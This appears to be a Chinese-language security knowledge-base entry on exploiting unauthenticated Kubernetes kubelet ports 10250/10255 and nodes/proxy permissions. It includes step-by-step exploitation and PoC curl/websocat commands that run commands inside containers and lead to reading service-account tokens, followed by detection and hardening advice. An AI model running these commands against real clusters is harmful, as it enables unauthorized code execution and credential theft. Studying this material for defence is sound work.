---
id: cloud-k8s-k8s-kubelet-unauth
title: Kubelet 10250/10255 未授权访问获取容器信息与执行命令
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-kubelet-unauth
aliases:
- kubelet 未授权
- 10250 未授权
- 10255 只读端口
- kubelet exec
- nodes/proxy 滥用
tags:
- kubernetes
- kubelet
- unauthorized
- rce
- 10250
- 10255
- nodes-proxy
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:42:35+08:00'
  notes: 已对照原文核对；10250/10255 端口、匿名认证、/pods 与 /exec 路径、nodes/proxy 代理路径均与原文一致；未本地复现
---

## 一句话结论

当 kubelet 的 10250 端口开启 `--anonymous-auth=true` 时，外部攻击者无需任何凭证即可列出节点上的 Pod 并在任意容器中执行命令；10255 只读端口则直接泄露节点与 Pod 的详细信息，为进一步攻击提供情报。

## 原理

- kubelet 在每个节点上监听 10250（HTTPS API），apiserver 通过它执行 `logs`、`exec`、`attach`、`port-forward`；10255 是只读 HTTP API，用于获取节点和 Pod 状态。
- 10250 的认证由 kubelet 启动参数控制。若 `--anonymous-auth=true` 且未配置 Webhook 授权，匿名请求会被当作 `system:anonymous`，在默认 RBAC 下可能拥有读取甚至 exec 权限。
- kubelet API 的路径与 apiserver 类似：`/pods` 列出 Pod，`/exec/{namespace}/{pod}/{container}?command=...` 在容器内执行命令。拿到任意容器 shell 后即可读取 SA Token、尝试容器逃逸。
- 10255 不需要认证，返回节点与 Pod 的详细信息，包括环境变量、挂载卷、镜像等；这些信息可用于精准选择目标容器或发现凭据。
- 另一条等价路径是 RBAC 的 `get nodes/proxy`：攻击者通过 apiserver 的 `/api/v1/nodes/{node}/proxy/` 代理访问 kubelet，不需要直接连 10250，也不需要 kubelet 对攻击者网络开放。

## 触发条件

- kubelet 10250 开启匿名认证且未启用 Webhook 授权，或匿名用户被绑定到可 exec 的角色。
- 10255 只读端口被启用并可从攻击者网络访问（新版默认关闭，需显式开启）。
- 或者当前 SA 拥有 `get nodes/proxy` 权限，且 kubelet 允许代理访问。
- 攻击者能访问节点 IP 的对应端口，或能通过 apiserver 代理。

## 利用步骤

1. 扫描 10250/10255，确认响应。
2. 访问 `https://<node>:10250/pods` 列出 Pod；访问 `http://<node>:10255/pods` 获取只读信息。
3. 从返回的 JSON 中选择目标 namespace/pod/container。
4. 用 `/exec/...` 执行 `id` 验证命令执行；必要时用 `websocat` 走 `v4.channel.k8s.io` 协议获得交互式 shell。
5. 进入容器后读取 SA Token、检查挂载与 capabilities，转入 Pod 内提权或容器逃逸。
6. 若只有 `nodes/proxy` 权限，则通过 apiserver 代理完成同样的枚举与 exec 尝试。

```bash
# 10250 列出 Pod
curl -k https://<node-ip>:10250/pods

# 10250 执行命令
curl -k "https://<node-ip>:10250/exec/<namespace>/<pod>/<container>?command=id&stdin=1&stdout=1&stderr=1&tty=1"

# 10255 只读信息
curl http://<node-ip>:10255/pods
```

## PoC

```bash
# 通过 apiserver 代理访问 kubelet（需要 get nodes/proxy）
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes/NODE_NAME/proxy/pods

# 通过代理执行命令
curl -k --cacert $CACERT -H "Authorization: Bearer $TOKEN" -N \
  "$APISERVER/api/v1/nodes/{nodeName}/proxy/exec/{namespace}/{pod}/{container}?command=id&output=1&error=1"

# 直连 kubelet 的交互式 exec
websocat --insecure --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  'wss://<node-ip>:10250/exec/{namespace}/{pod}/{container}?output=1&error=1&command=id'
```

## 变体与关联

- 10255 只读泄露通常不直接 RCE，但会暴露环境变量、挂载路径、镜像版本，可用于选择目标或发现凭据。
- `nodes/proxy` 权限可绕过节点网络隔离，通过 apiserver 访问 kubelet；即使 10250 只对节点内网开放也有效。
- kubelet 的 `--authorization-mode=Webhook` 会把授权委托给 apiserver；若 SA 有对应权限，代理路径同样可用。
- 关联：`[[cloud-k8s-k8s-pod-sa-token-rbac-enumeration]]` 是 `nodes/proxy` 权限的来源；`[[cloud-container-k8s-workload-config-escape]]` 是拿到容器 shell 后的下一步；`[[cloud-k8s-k8s-etcd-unauth]]` 是另一条外部未授权路径。

## 检测与防御

- 检测：外部对 10250/10255 的访问；kubelet 日志中的匿名请求、`/exec`、`/pods` 调用；apiserver 审计中 `nodes/proxy` 的高频使用。
- 检测：容器内出现异常进程或 exec 会话；同一节点短时间内多个容器的 exec 请求。
- 防御：kubelet 设置 `--anonymous-auth=false`，启用 `--authorization-mode=Webhook`；关闭 10255 只读端口。
- 防御：防火墙/安全组只允许 apiserver 与控制面访问 10250，禁止从 Pod 网络或公网直连；用 NetworkPolicy 限制 Pod 到节点端口的访问。
- 加固：RBAC 中收紧 `nodes/proxy`；启用 kubelet 证书轮换；对 kubelet API 做审计与告警。
